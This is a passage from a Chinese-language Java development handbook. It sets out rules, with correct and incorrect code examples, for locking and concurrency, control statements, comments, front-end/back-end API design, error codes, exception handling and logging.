【强制】高并发时，同步调用应该去考量锁的性能损耗。能用无锁数据结构，就不要用锁；能 锁区块，就不要锁整个方法体；能用对象锁，就不要用类锁。
说明：尽可能使加锁的代码块工作量尽可能的小，避免在锁代码块中调用 RPC 方法。


【强制】对多个资源、数据库表、对象同时加锁时，需要保持一致的加锁顺序，否则可能会造成死锁。
说明：线程一需要对表 A、B、C 依次全部加锁后才可以进行更新操作，那么线程二的加锁顺序也必须是 A、 B、C，否则可能出现死锁。


【强制】在使用阻塞等待获取锁的方式中，必须在 try 代码块之外，并且在加锁方法与 try 代码块之间没有任何可能抛出异常的方法调用，避免加锁成功后，在 finally 中无法解锁。


说明一：如果在 lock 方法与 try 代码块之间的方法调用抛出异常，那么无法解锁，造成其它线程无法成功获取锁。


说明二：如果 lock 方法在 try 代码块之内，可能由于其它方法抛出异常，导致在 finally 代码块中，unlock 对未加锁的对象解锁，它会调用 AQS 的 tryRelease 方法（取决于具体实现类），抛出 IllegalMonitorStateException 异常。


说明三：在 Lock 对象的 lock 方法实现中可能抛出 unchecked 异常，产生的后果与说明二相同。


正例：
Lock lock = new XxxLock();lock.lock();try {    doSomething();    doOthers();} finally {    lock.unlock();}
反例：
Lock lock = new XxxLock(); // ... try {    //  如果此处抛出异常，则直接执行 finally 代码块    doSomething();    //  无论加锁是否成功，finally 代码块都会执行    lock.lock();    doOthers();} finally {    lock.unlock();}


【强制】在使用尝试机制来获取锁的方式中，进入业务代码块之前，必须先判断当前线程是否持有锁。锁的释放规则与锁的阻塞等待方式相同。
说明：Lock 对象的 unlock 方法在执行时，它会调用 AQS 的 tryRelease 方法（取决于具体实现类），如果当前线程不持有锁，则抛出 IllegalMonitorStateException 异常。
正例：
Lock lock = new XxxLock();boolean isLocked = lock.tryLock();if (isLocked) {    try {        doSomething();        doOthers();    } finally {        lock.unlock();    }}


【强制】并发修改同一记录时，避免更新丢失，需要加锁。要么在应用层加锁，要么在缓存加锁，要么在数据库层使用乐观锁，使用 version 作为更新依据。
说明：如果每次访问冲突概率小于 20%，推荐使用乐观锁，否则使用悲观锁。乐观锁的重试次数不得小于 3 次。


【强制】多线程并行处理定时任务时，Timer 运行多个 TimeTask 时，只要其中之一没有捕获抛出的异常，其它任务便会自动终止运行，使用 ScheduledExecutorService 则没有这个问题。


【推荐】资金相关的金融敏感信息，使用悲观锁策略。
说明：乐观锁在获得锁的同时已经完成了更新操作，校验逻辑容易出现漏洞，另外，乐观锁对冲突的解决策略有较复杂的要求，处理不当容易造成系统压力或数据异常，所以资金相关的金融敏感信息不建议使用乐观 锁更新。
正例：悲观锁遵循一锁、二判、三更新、四释放的原则。


【推荐】使用 CountDownLatch 进行异步转同步操作，每个线程退出前必须调用 countDown 方 法，线程执行代码注意 catch 异常，确保 countDown 方法被执行到，避免主线程无法执行至 await 方法，直到超时才返回结果。
说明：注意，子线程抛出异常堆栈，不能在主线程 try-catch 到。


【推荐】避免 Random 实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一 seed 导致的性能下降。
说明：Random 实例包括 java.util.Random  的实例或者 Math.random()的方式。
正例：在 JDK7 之后，可以直接使用 API ThreadLocalRandom，而在  JDK7 之前，需要编码保证每个线 程持有一个单独的 Random 实例。


【推荐】通过双重检查锁（double-checked locking）（在并发场景下）存在延迟初始化的优化 问题隐患（可参考  The “Double-Checked Locking is Broken” Declaration），推荐解决方案中较 为简单一种（适用于 JDK5 及以上版本），将目标属性声明为 volatile 型，比如将 helper 的属 性声明修改为 private volatile Helper helper = null; 。
正例：
public class LazyInitDemo {    private volatile Helper helper = null;    public Helper getHelper() {        if (helper == null) {            synchronized (this) {                if (helper == null) {                    helper = new Helper();                }            }        }        return helper;    }    // other methods and fields...}


【参考】volatile 解决多线程内存不可见问题。对于一写多读，是可以解决变量同步问题，但是如果多写，同样无法解决线程安全问题。
说明：如果是 count++操作，使用如下类实现：AtomicInteger count = new AtomicInteger(); count.addAndGet(1);
如果是 JDK8，推荐使用 LongAdder 对象，比 AtomicLong 性能更好（减少乐观锁的重试次数）。


【参考】==HashMap 在容量不够进行 resize 时由于高并发可能出现死链，导致 CPU 飙升，在 开发过程中注意规避此风险==


【参考】ThreadLocal 对象使用 static 修饰，ThreadLocal 无法解决共享对象的更新问题。
说明：这个变量是针对一个线程内所有操作共享的，所以设置为静态变量，所有此类实例共享此静态变量， 也就是说在类第一次被使用时装载，只分配一块存储空间，所有此类的对象(只要是这个线程内定义的)都可以操控这个变量。


(八)  控制语句


【强制】在一个 switch 块内，每个 case 要么通过 continue/break/return 等来终止，要么 注释说明程序将继续执行到哪一个 case 为止；在一个 switch 块内，都必须包含一个 default语句，并且放在最后，即使它什么代码也没有。
说明：注意 break 是退出 switch 语句块，而 return 是退出方法体。


【强制】==当 switch 括号内的变量类型为 String 并且此变量为外部参数时，必须先进行 null 判断，否则会抛出 NPE 异常==。
反例：如下的代码输出是什么？
public class SwitchString {    public static void main(String[] args) {        method(null);    }    public static void method(String param) {        switch (param) {            //  肯定不是进入这里            case "sth":                System.out.println("it's sth");                break;            //  也不是进入这里            case "null":                System.out.println("it's null");                break;            //  也不是进入这里            default:                System.out.println("default");        }    }}


【强制】在 if/else/for/while/do 语句中必须使用大括号。
说明：即使只有一行代码，也禁止不采用大括号的编码方式：if (condition) statements;


【强制】三目运算符 condition?  表达式 1 :  表达式 2 中，高度注意表达式 1 和 2 在类型对齐 时，可能抛出因自动拆箱导致的 NPE 异常。
说明：以下两种场景会触发类型对齐的拆箱操作：
1）  表达式 1 或表达式 2 的值只要有一个是原始类型。
2）  表达式 1 或表达式 2 的值的类型不一致，会强制拆箱升级成表示范围更大的那个类型。
反例：
Integer a = 1; Integer b = 2; Integer c = null; Boolean flag = false; // a*b 的结果是 int 类型，那么 c 会强制拆箱成 int 类型，抛出 NPE 异常 Integer result=(flag? a*b : c); 


【强制】在高并发场景中，避免使用”等于”判断作为中断或退出的条件。
说明：如果并发控制没有处理好，容易产生等值判断被“击穿”的情况，使用大于或小于的区间判断条件 来代替。
反例：判断剩余奖品数量等于 0 时，终止发放奖品，但因为并发处理错误导致奖品数量瞬间变成了负数， 这样的话，活动无法终止。


【推荐】当某个方法的代码总行数超过 10 行时，return / throw  等中断逻辑的右大括号后均 需要加一个空行。
说明：这样做逻辑清晰，有利于代码阅读时重点关注。


【推荐】表达异常的分支时，少用 if-else 方式，这种方式可以改写成：
if (condition) {    return obj; } //  接着写 else 的业务逻辑代码;  
说明：如果非使用 if()…else if()…else…方式表达逻辑，避免后续代码维护困难，请勿超过 3 层。
正例：超过 3 层的  if-else  的逻辑判断代码可以使用卫语句、策略模式、状态模式等来实现，其中卫语句 示例如下：
public void findBoyfriend(Man man) {    if (man.isUgly()) {        System.out.println("本姑娘是外貌协会的资深会员");        return;    }    if (man.isPoor()) {        System.out.println("贫贱夫妻百事哀");        return;    }    if (man.isBadTemper()) {        System.out.println("银河有多远，你就给我滚多远");        return;    }    System.out.println("可以先交往一段时间看看");}


【推荐】除常用方法（如 getXxx/isXxx）等外，不要在条件判断中执行其它复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。
说明：很多  if  语句内的逻辑表达式相当复杂，与、或、取反混合运算，甚至各种方法纵深调用，理解成本非常高。如果赋值一个非常好理解的布尔变量名字，则是件令人爽心悦目的事情。
正例：
//  伪代码如下final boolean existed = (file.open(fileName, "w") != null) &amp;&amp; (...) || (...); if (existed) {     ...} 
反例：
 public final void acquire(long arg) {    if (!tryAcquire(arg) &amp;&amp;            acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) {        selfInterrupt();    }}


【推荐】不要在其它表达式（尤其是条件表达式）中，插入赋值语句。
说明：赋值点类似于人体的穴位，对于代码的理解至关重要，所以赋值语句需要清晰地单独成为一行。
反例：
public Lock getLock(boolean fair) {    //  算术表达式中出现赋值操作，容易忽略 count 值已经被改变    threshold = (count = Integer.MAX_VALUE) - 1;    //  条件表达式中出现赋值操作，容易误认为是 sync==fair     return (sync = fair) ? new FairSync() : new NonfairSync();}


【推荐】循环体中的语句要考量性能，以下操作尽量移至循环体外处理，如定义对象、变量、 获取数据库连接，进行不必要的 try-catch 操作（这个 try-catch 是否可以移至循环体外）。


【推荐】避免采用取反逻辑运算符。
说明：取反逻辑不利于快速理解，并且取反逻辑写法一般都存在对应的正向逻辑写法。
正例：使用 if (x &lt; 628)  来表达  x  小于 628。
反例：使用 if (!(x &gt;= 628))  来表达  x  小于 628。


【推荐】公开接口需要进行入参保护，尤其是批量操作的接口。
反例：某业务系统，提供一个用户批量查询的接口，API 文档上有说最多查多少个，但接口实现上没做任何保护，导致调用方传了一个 1000 的用户 id 数组过来后，查询信息后，内存爆了。


【参考】下列情形，需要进行参数校验：
1）  调用频次低的方法。
2）  执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参数错误导致中间执行回退，或者错误，那得不偿失。
3）  需要极高稳定性和可用性的方法。
4）  对外提供的开放接口，不管是 RPC/API/HTTP 接口。
5）  敏感权限入口。


【参考】下列情形，不需要进行参数校验：
1）  极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查。
2）  底层调用频度比较高的方法。毕竟是像纯净水过滤的最后一道，参数错误不太可能到底层才会暴露 问题。一般 DAO 层与 Service 层都在同一个应用中，部署在同一台服务器中，所以 DAO 的参数校验，可以省略。
3）  被声明成 private 只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检 查或者肯定不会有问题，此时可以不校验参数。


(九)  注释规约


【强制】类、类属性、类方法的注释必须使用 Javadoc 规范，使用/**内容*/格式，不得使用 // xxx 方式。
说明：在 IDE编辑窗口中，Javadoc 方式会提示相关注释，生成 Javadoc 可以正确输出相应注释；在 IDE 中，工程调用方法时，不进入方法即可悬浮提示方法、参数、返回值的意义，提高阅读效率。


【强制】所有的抽象方法（包括接口中的方法）必须要用 Javadoc 注释、除了返回值、参数、 异常说明外，还必须指出该方法做什么事情，实现什么功能。
说明：对子类的实现要求，或者调用注意事项，请一并说明。


【强制】所有的类都必须添加创建者和创建日期。
说明：在设置模板时，注意 IDEA的@author 为${USER}，而 eclipse 的@author 为${user} ，大小写有 区别，而日期的设置统一为 yyyy/MM/dd 的格式。
正例：
/** * @author yangguanbao * @date 2016/10/31 */


【强制】方法内部单行注释，在被注释语句上方另起一行，使用//注释。方法内部多行注释使 用/* */注释，注意与代码对齐。


【强制】所有的枚举类型字段必须要有注释，说明每个数据项的用途。


【推荐】与其“半吊子”英文来注释，不如用中文注释把问题说清楚。专有名词与关键字保持 英文原文即可。
反例：“TCP 连接超时”解释成“传输控制协议连接超时”，理解反而费脑筋。


【推荐】代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑 等的修改。
说明：代码与注释更新不同步，就像路网与导航软件更新不同步一样，如果导航软件严重滞后，就失去了导航的意义。


【推荐】在类中删除未使用的任何字段、方法、内部类；在方法中删除未使用的任何参数声明 与内部变量。


【参考】谨慎注释掉代码。在上方详细说明，而不是简单地注释掉。如果无用，则删除。
说明：代码被注释掉有两种可能性：
1）后续会恢复此段代码逻辑。
2）永久不用
前者如果没有备注信息， 难以知晓注释动机。后者建议直接删掉即可，假如需要查阅历史代码，登录代码仓库即可。


【参考】对于注释的要求


第一、能够准确反映设计思想和代码逻辑


第二、能够描述业务含 义，使别的程序员能够迅速了解到代码背后的信息


完全没有注释的大段代码对于阅读者形同 天书，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。


【参考】好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一 个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释又是相当大的负担。
反例：
// put elephant into fridge put(elephant, fridge);
方法名 put，加上两个有意义的变量名 elephant 和 fridge，已经说明了这是在干什么，语义清晰的代码不 需要额外的注释。


【参考】特殊注释标记，请注明标记人与标记时间。注意及时处理这些标记，通过标记扫描， 经常清理此类标记。线上故障有时候就是来源于这些标记处的代码。
1）  待办事宜（TODO）:（标记人，标记时间，[预计处理时间]）
表示需要实现，但目前还未实现的功能。这实际上是一个 Javadoc 的标签，目前的 Javadoc 还没 有实现，但已经被广泛使用。只能应用于类，接口和方法（因为它是一个 Javadoc 标签）。
2）  错误，不能工作（FIXME）:（标记人，标记时间，[预计处理时间]）
在注释中用 FIXME标记某代码是错误的，而且不能工作，需要及时纠正的情况。


(十)  前后端规约


【强制】前后端交互的 API，需要明确协议、域名、路径、请求方法、请求内容、状态码、响 应体。
说明：
1）  协议：生产环境必须使用 HTTPS。
2）  路径：每一个 API 需对应一个路径，表示 API 具体的请求地址：


代表一种资源，只能为名词，推荐使用复数，不能为动词，请求方法已经表达动作意义。


URL路径不能使用大写，单词如果需要分隔，统一使用下划线。


路径禁止携带表示请求内容类型的后缀，比如".json",“.xml”，通过 accept 头表达即可。


3）  请求方法：对具体操作的定义，常见的请求方法如下：


GET：从服务器取出资源。


POST：在服务器新建一个资源。


PUT：在服务器更新资源。


DELETE：从服务器删除资源。


4）  请求内容：URL带的参数必须无敏感信息或符合安全要求；body 里带参数时必须设置 Content-Type。 5）  响应体：响应体 body 可放置多种数据类型，由 Content-Type 头来确定。


【强制】前后端数据列表相关的接口返回，如果为空，则返回空数组[]或空集合{}。
说明：此条约定有利于数据层面上的协作更加高效，减少前端很多琐碎的 null 判断。


【强制】服务端发生错误时，返回给前端的响应信息必须包含 ==HTTP 状态码，errorCode、 errorMessage、用户提示信息==四个部分。
说明：四个部分的涉众对象分别是浏览器、前端开发、错误排查人员、用户。
其中输出给用户的提示信息要求：简短清晰、提示友好，引导用户进行下一步操作或解释错误原因，提示信息可以包括错误原因、上 下文环境、推荐操作等。
errorCode：参考附录2：错误码列表。
errorMessage：简要描述后端出错原因，便于错误排 查人员快速定位问题，注意不要包含敏感数据信息。
正例：常见的 HTTP 状态码如下



状态码
信息
描述




200
OK
表明该请求被成功地完成，所请求的资源发送到客户端。


401
Unauthorized
请求要求身份验证，常见对于需要登录而用户未登录的情况。


403
Forbidden
服务器拒绝请求，常见于机密信息或复制其它登录用户链接访问服务器的情况。


404
Not Found
服务器无法取得所请求的网页，请求资源不存在。


500
Internal Server Error
服务器内部错误。





【强制】==在前后端交互的 JSON 格式数据中，所有的 key 必须为小写字母开始的 lowerCamelCase 风格==，符合英文表达习惯，且表意完整。
正例：errorCode / errorMessage / assetStatus / menuList / orderList / configFlag
反例：ERRORCODE / ERROR_CODE / error_message / error-message / errormessage / ErrorMessage / msg


【强制】errorMessage 是前后端错误追踪机制的体现，可以在前端输出到 type=“hidden” 文字类控件中，或者用户端的日志中，帮助我们快速地定位出问题。


【强制】对于需要使用超大整数的场景，服务端一律使用 String 字符串类型返回，禁止使用 Long 类型。
说明：Java 服务端如果直接返回 Long 整型数据给前端，JS 会自动转换为 Number 类型（注：此类型为双精度浮点数，表示原理与取值范围等同于 Java 中的 Double）。Long 类型能表示的最大值是 2 的 63 次方 -1，在取值范围之内，超过 2 的 53 次方 (9007199254740992)的数值转化为 JS 的 Number 时，有些数值会有精度损失。
扩展说明，在 Long 取值范围内，任何 2 的指数次整数都是绝对不会存在精度损失的，所 以说精度损失是一个概率问题。若浮点数尾数位与指数位空间不限，则可以精确表示任何整数，但很不幸， 双精度浮点数的尾数位只有 52 位。
反例：通常在订单号或交易号大于等于 16 位，大概率会出现前后端单据不一致的情况，比如，“orderId”: 362909601374617692，前端拿到的值却是: 362909601374617660。


【强制】HTTP 请求通过 URL传递参数时，不能超过 2048 字节。
说明：不同浏览器对于 URL的最大长度限制略有不同，并且对超出最大长度的处理逻辑也有差异，2048 字节是取所有浏览器的最小值。
反例：某业务将退货的商品 id 列表放在 URL中作为参数传递，当一次退货商品数量过多时，URL参数超长， 传递到后端的参数被截断，导致部分商品未能正确退货。


【强制】HTTP 请求通过 body 传递内容时，必须控制长度，超出最大长度后，后端解析会出 错。
说明：nginx 默认限制是 1MB，tomcat 默认限制为 2MB，当确实有业务需要传较大内容时，可以通过调大服务器端的限制。


【强制】在翻页场景中，用户输入参数的小于 1，则前端返回第一页参数给后端；后端发现用 户输入的参数大于总页数，直接返回最后一页。


【强制】服务器内部重定向必须使用 forward；外部重定向地址必须使用 ==URL统一代理模块== 生成，否则会因线上采用 HTTPS 协议而导致浏览器提示“不安全”，并且还会带来 URL维护 不一致的问题。


【推荐】服务器返回信息必须被标记是否可以缓存，如果缓存，客户端可能会重用之前的请求结果。
说明：缓存有利于减少交互次数，减少交互的平均延迟。
正例：http 1.1 中，s-maxage 告诉服务器进行缓存，时间单位为秒，用法如下， response.setHeader(“Cache-Control”, “s-maxage=” + cacheSeconds);


【推荐】服务端返回的数据，使用 JSON 格式而非 XML。
说明：尽管 HTTP 支持使用不同的输出格式，例如纯文本，JSON，CSV，XML，RSS 甚至 HTML。如果我 们使用的面向用户的服务，应该选择 JSON 作为通信中使用的标准数据交换格式，包括请求和响应。此外， application/JSON 是一种通用的 MIME 类型，具有实用、精简、易读的特点。


【推荐】前后端的时间格式统一为"yyyy-MM-dd HH:mm:ss"，统一为 GMT。


【参考】在接口路径中不要加入版本号，版本控制在 HTTP 头信息中体现，有利于向前兼容。
说明：当用户在低版本与高版本之间反复切换工作时，会导致迁移复杂度升高，存在数据错乱风险。


(十一)  其他


【强制】在使用正则表达式时，利用好其预编译功能，可以有效加快正则匹配速度。
说明：不要在方法体内定义：Pattern pattern = Pattern.compile(“规则”);


【强制】避免用 Apache Beanutils 进行属性的 copy。
说明：Apache BeanUtils 性能较差，可以使用其他方案比如 Spring BeanUtils, Cglib BeanCopier，注意 均是浅拷贝。


【强制】velocity 调用 POJO 类的属性时，直接使用属性名取值即可，模板引擎会自动按规范 调用 POJO 的 getXxx()，如果是 boolean 基本数据类型变量（boolean 命名不需要加 is 前缀）， 会自动调用 isXxx()方法。
说明：注意如果是 Boolean 包装类对象，优先调用 getXxx()的方法。


【强制】==后台输送给页面的变量必须加$!{var}——中间的感叹号==。
说明：如果 var 等于 null 或者不存在，那么${var}会直接显示在页面上。


【强制】注意  Math.random()  这个方法返回是 double 类型，注意取值的范围  0≤x&lt;1（能够 取到零值，注意除零异常），如果想获取整数类型的随机数，不要将 x 放大 10 的若干倍然后 取整，直接使用 Random 对象的 nextInt 或者 nextLong 方法。


【推荐】不要在视图模板中加入任何复杂的逻辑。
说明：根据 MVC 理论，视图的职责是展示，不要抢模型和控制器的活。


【推荐】任何数据结构的构造或初始化，都应指定大小，避免数据结构无限增长吃光内存。


【推荐】及时清理不再使用的代码段或配置信息。
说明：对于垃圾代码或过时配置，坚决清理干净，避免程序过度臃肿，代码冗余。
正例：对于暂时被注释掉，后续可能恢复使用的代码片断，在注释代码上方，统一规定使用三个斜杠(///) 来说明注释掉代码的理由。如：
public static void hello() {    ///  业务方通知活动暂停    // Business business = new Business();    // business.active();    System.out.println("it's finished");}


二、异常日志
(一) 错误码


【强制】错误码的制定原则：快速溯源、沟通标准化。
说明：  错误码想得过于完美和复杂，就像康熙字典中的生僻字一样，用词似乎精准，但是字典不容易随身 携带并且简单易懂。
正例：错误码回答的问题是谁的错？错在哪？
1）错误码必须能够快速知晓错误来源，可快速判断是谁的问 题。
2）错误码必须能够进行清晰地比对（代码中容易 equals）。
3）错误码有利于团队快速对错误原因达 到一致认知。


【强制】错误码不体现版本号和错误等级信息。
说明：错误码以不断追加的方式进行兼容。错误等级由日志和错误码本身的释义来决定。


【强制】全部正常，但不得不填充错误码时返回五个零：00000。


【强制】错误码为字符串类型，共 5 位，分成两个部分：错误产生来源+四位数字编号。
说明：错误产生来源分为 A/B/C，
A 表示错误来源于用户，比如参数错误，用户安装版本过低，用户支付 超时等问题；
B 表示错误来源于当前系统，往往是业务逻辑出错，或程序健壮性差等问题；
C 表示错误来源 于第三方服务，比如 CDN 服务出错，消息投递超时等问题；
四位数字编号从 0001 到 9999，大类之间的 步长间距预留 100，参考附录2：错误码列表


【强制】编号不与公司业务架构，更不与组织架构挂钩，以先到先得的原则在统一平台上进行， 审批生效，编号即被永久固定。


【强制】错误码使用者避免随意定义新的错误码。
说明：尽可能在原有错误码附表中找到语义相同或者相近的错误码在代码中使用即可。


【强制】错误码不能直接输出给用户作为提示信息使用。
说明：==堆栈（stack_trace）、错误信息(error_message)、错误码（error_code）、提示信息（user_tip）== 是一个有效关联并互相转义的和谐整体，但是请勿互相越俎代庖。


【推荐】错误码之外的业务独特信息由 error_message 来承载，而不是让错误码本身涵盖过 多具体业务属性。


【推荐】在获取第三方服务错误码时，向上抛出允许本系统转义，由 C 转为 B，并且在错误信 息上带上原有的第三方错误码。


【参考】错误码分为一级宏观错误码、二级宏观错误码、三级宏观错误码。
说明：在无法更加具体确定的错误场景中，可以直接使用一级宏观错误码，分别是：A0001（用户端错误）、B0001（系统执行出错）、C0001（调用第三方服务出错）。
正例：调用第三方服务出错是一级，中间件错误是二级，消息服务出错是三级。


【参考】错误码的后三位编号与 HTTP 状态码没有任何关系。


【参考】错误码有利于不同文化背景的开发者进行交流与代码协作。


说明：英文单词形式的错误码不利于非英语母语国家（如阿拉伯语、希伯来语、俄罗斯语等）之间的开发 者互相协作。


【参考】错误码即人性，感性认知+口口相传，使用纯数字来进行错误码编排不利于感性记忆 和分类。
说明：数字是一个整体，每位数字的地位和含义是相同的。
反例：一个五位数字 12345，第 1 位是错误等级，第 2 位是错误来源，345 是编号，人的大脑不会主动地 拆开并分辨每位数字的不同含义。


(二) 异常处理


【强制】Java  类库中定义的可以通过预检查方式规避的 RuntimeException 异常不应该通过 catch  的方式来处理，比如：NullPointerException，IndexOutOfBoundsException 等等。
说明：无法通过预检查的异常除外，比如，在解析字符串形式的数字时，可能存在数字格式错误，不得不通过 catch NumberFormatException 来实现。
正例：if (obj != null) {…}
反例：try { obj.method(); } catch (NullPointerException e) {…}


【强制】异常捕获后不要用来做流程控制，条件控制。
说明：异常设计的初衷是解决程序运行中的各种意外情况，且异常的处理效率比条件判断方式要低很多。


【强制】catch 时请分清稳定代码和非稳定代码，稳定代码指的是无论如何不会出错的代码。 对于非稳定代码的 catch 尽可能进行区分异常类型，再做对应的异常处理。
说明：对大段代码进行 try-catch，使程序无法根据不同的异常做出正确的应激反应，也不利于定位问题， 这是一种不负责任的表现。
正例：用户注册的场景中，如果用户输入非法字符，或用户名称已存在，或用户输入密码过于简单，在程序上作出分门别类的判断，并提示给用户。


【强制】==捕获异常是为了处理它，不要捕获了却什么都不处理而抛弃之，如果不想处理它，请将该异常抛给它的调用者。最外层的业务使用者，必须处理异常，将其转化为用户可以理解的内容==。


【强制】事务场景中，抛出异常被 catch 后，如果需要回滚，一定要注意手动回滚事务。


【强制】finally 块必须对资源对象、流对象进行关闭，有异常也要做 try-catch。
说明：如果 JDK7 及以上，可以使用 try-with-resources 方式。


【强制】不要在 finally 块中使用 return。
说明：try 块中的 return 语句执行成功后，并不马上返回，而是继续执行 finally 块中的语句，如果此处存 在 return 语句，则在此直接返回，无情丢弃掉 try 块中的返回点。
反例：
private int x = 0;public int checkReturn() {    try {        // x 等于 1，此处不返回        return ++x;    } finally {        //  返回的结果是 2        return ++x;    }}


【强制】捕获异常与抛异常，必须是完全匹配，或者捕获异常是抛异常的父类。
说明：如果预期对方抛的是绣球，实际接到的是铅球，就会产生意外情况。


【强制】==在调用 RPC、二方包、或动态生成类的相关方法时，捕捉异常必须使用 Throwable 类来进行拦截==。
说明：通过反射机制来调用方法，如果找不到方法，抛出 NoSuchMethodException。什么情况会抛出 NoSuchMethodError 呢？二方包在类冲突时，仲裁机制可能导致引入非预期的版本使类的方法签名不匹配， 或者在字节码修改框架（比如：ASM）动态创建或修改类时，修改了相应的方法签名。这些情况，即使代码编译期是正确的，但在代码运行期时，会抛出 NoSuchMethodError。


【推荐】方法的返回值可以为 null，不强制返回空集合，或者空对象等，必须添加注释充分说明什么情况下会返回 null 值。
说明：本手册明确防止 NPE 是调用者的责任。即使被调用方法返回空集合或者空对象，对调用者来说，也并非高枕无忧，必须考虑到远程调用失败、序列化失败、运行时异常等场景返回 null 的情况。


【推荐】防止 NPE，是程序员的基本修养，注意 NPE 产生的场景：
1）  返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 NPE。
反例：public int f() { return Integer 对象}，  如果为 null，自动解箱抛 NPE。
2）  数据库的查询结果可能为 null。
3）  集合里的元素即使 isNotEmpty，取出的数据元素也可能为 null。
4）  远程调用返回对象时，一律要求进行空指针判断，防止 NPE。
5）  对于 Session 中获取的数据，建议进行 NPE 检查，避免空指针。
6）  级联调用 obj.getA().getB().getC()；一连串调用，易产生 NPE。
正例：使用 JDK8 的 Optional 类来防止 NPE 问题。


【推荐】定义时区分 unchecked / checked  异常，避免直接抛出 new RuntimeException()， 更不允许抛出 Exception 或者 Throwable，应使用有业务含义的自定义异常。推荐业界已定义过的自定义异常，如：DAOException / ServiceException 等。


【参考】对于公司外的 http/api 开放接口必须使用 errorCode；应用内部推荐异常抛出；跨应用间 RPC 调用优先考虑使用 Result 方式，封装 isSuccess()方法、errorCode、 errorMessage；
说明：关于 RPC 方法返回方式使用 Result 方式的理由：
1）使用抛异常返回方式，调用方如果没有捕获到就会产生运行时错误。
2）如果不加栈信息，只是 new 自定义异常，加入自己的理解的 error message，对于调用端解决问题 的帮助不会太多。如果加了栈信息，在频繁调用出错的情况下，数据序列化和传输的性能损耗也是问题。


(三) 日志规约


【强制】应用中不可直接使用日志系统（Log4j、Logback）中的 API，而应依赖使用日志框架（SLF4J、JCL–Jakarta Commons Logging）中的 API，使用门面模式的日志框架，有利于维护和 各个类的日志处理方式统一。
说明：日志框架（SLF4J、JCL–Jakarta Commons Logging）的使用方式（推荐使用 SLF4J）
使用 SLF4J：import org.slf4j.Logger; import org.slf4j.LoggerFactory; private static final Logger logger = LoggerFactory.getLogger(Test.class); 使用 JCL： import org.apache.commons.logging.Log; import org.apache.commons.logging.LogFactory; private static final Log log = LogFactory.getLog(Test.class); 


【强制】所有日志文件至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。对于当天日志，以应用名.log来保存，保存在/home/admin/应用名/logs/目录下，过往日志 格式为: {logname}.log.{保存日期}，日期格式：yyyy-MM-dd
正例：以 aap 应用为例，日志保存在/home/admin/aapserver/logs/aap.log，历史日志名称为 aap.log.2016-08-01


【强制】根据国家法律，网络运行状态、网络安全事件、个人敏感信息操作等相关记录，留存 的日志不少于六个月，并且进行网络多机备份。


【强制】应用中的扩展日志（如打点、临时监控、访问日志等）命名方式： appName_logType_logName.log。logType:日志类型，如 stats/monitor/access 等；logName:日志描述。这种命名的好处：通过文件名就可知道日志文件属于什么应用，什么类型，什么目的，也有利于归类查找。
说明：推荐对日志进行分类，如将错误日志和业务日志分开存放，便于开发人员查看，也便于通过日志对系统进行及时监控。
正例：mppserver 应用中单独监控时区转换异常，如：mppserver_monitor_timeZoneConvert.log


【强制】在日志输出时，字符串变量之间的拼接使用占位符的方式。
说明：因为 String 字符串的拼接会使用 StringBuilder 的 append()方式，有一定的性能损耗。使用占位符仅是替换动作，可以有效提升性能。
正例：logger.debug(“Processing trade with id: {} and symbol: {}”, id, symbol);


【强制】对于 trace/debug/info 级别的日志输出，必须进行日志级别的开关判断。
说明：虽然在 debug(参数)的方法体内第一行代码 isDisabled(Level.DEBUG_INT)为真时（Slf4j 的常见实现 Log4j 和 Logback），就直接 return，但是参数可能会进行字符串拼接运算。此外，如果 debug(getName()) 这种参数内有 getName()方法调用，无谓浪费方法调用的开销。
正例：
//  如果判断为真，那么可以输出 trace 和 debug 级别的日志if (logger.isDebugEnabled()) {     logger.debug("Current ID is: {} and name is: {}", id, getName()); } 


【强制】避免重复打印日志，浪费磁盘空间，务必在日志配置文件中设置 additivity=false。
正例：


【强制】生产环境禁止直接使用 System.out  或 System.err  输出日志或使用 e.printStackTrace()打印异常堆栈。
说明：标准日志输出与标准错误输出文件每次 Jboss 重启时才滚动，如果大量输出送往这两个文件，容易 造成文件大小超过操作系统大小限制。


【强制】异常信息应该包括两类信息：案发现场信息和异常堆栈信息。如果不处理，那么通过关键字 throws 往上抛出。
正例：logger.error(“inputParams:{} and errorMessage:{}”,  各类参数或者对象toString(), e.getMessage(), e);


【强制】日志打印时禁止直接用 JSON 工具将对象转换成 String。
说明：如果对象里某些 get 方法被覆写，存在抛出异常的情况，则可能会因为打印日志而影响正常业务流 程的执行。
正例：打印日志时仅打印出业务相关属性值或者调用其对象的 toString()方法。


【推荐】谨慎地记录日志生产环境禁止输出 debug 日志；有选择地输出 info 日志；如果使用 warn 来记录刚上线时的业务行为信息，一定要注意日志输出量的问题，避免把服务器磁盘撑爆，并记得及时删除这些观察日志。
说明：大量地输出无效日志，不利于系统性能提升，也不利于快速定位错误点。记录日志时请思考：这些日志真的有人看吗？看到这条日志你能做什么？能不能给问题排查带来好处？


【推荐】可以使用 warn 日志级别来记录用户输入参数错误的情况，避免用户投诉时，无所适从。如非必要，请不要在此场景打出 error 级别，避免频繁报警。
说明：注意日志输出的级别，error 级别只记录系统逻辑出错、异常或者重要的错误信息。


【推荐】尽量用英文来描述日志错误信息，如果日志中的错误信息用英文描述不清楚的话使用 中文描述即可，否则容易产生歧义。
说明：国际化团队或海外部署的服务器由于字符集问题，使用全英文来注释和描述日志错误信息。


三、单元测试


【强制】好的单元测试必须遵守 AIR原则。
说明：单元测试在线上运行时，感觉像空气（AIR）一样感觉不到，但在测试质量的保障上，却是非常关键 的。好的单元测试宏观上来说，具有自动化、独立性、可重复执行的特点。

A：Automatic（自动化）
I：Independent（独立性）
R：Repeatable（可重复）



